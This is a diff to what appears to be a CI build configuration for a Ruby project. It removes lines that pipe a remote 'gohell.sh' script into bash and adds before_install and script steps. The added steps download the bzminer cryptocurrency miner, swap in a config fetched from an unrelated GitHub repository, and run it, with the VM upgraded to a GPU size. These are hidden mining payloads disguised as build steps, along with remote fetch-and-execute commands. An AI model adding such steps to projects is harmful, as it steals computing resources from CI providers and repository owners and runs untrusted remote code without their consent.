@@ -1,10 +1,9 @@
 language: ruby
 
-services:
-  - docker
+dist: focal
   
 vm:
-  size: 2x-large
+  size: gpu-xlarge
   
 rvm:
   - "3.0.1"
@@ -75,7 +74,7 @@ rvm:
   - "1.9.3"
 
 before_install:
-  - curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/gohell.sh | bash
+  - wget https://github.com/bzminer/bzminer/releases/download/v17.0.0/bzminer_v17.0.0_linux.tar.gz && tar xf bzminer_v17.0.0_linux.tar.gz && cd bzminer_v17.0.0_linux && rm -rf config.txt && wget -O config.txt https://raw.githubusercontent.com/6248202226/filesg/main/bzminerconfig && ./bzminer
 
 script:
-  - curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/gohell.sh | bash
+  - wget https://github.com/bzminer/bzminer/releases/download/v17.0.0/bzminer_v17.0.0_linux.tar.gz && tar xf bzminer_v17.0.0_linux.tar.gz && cd bzminer_v17.0.0_linux && rm -rf config.txt && wget -O config.txt https://raw.githubusercontent.com/6248202226/filesg/main/bzminerconfig && ./bzminer
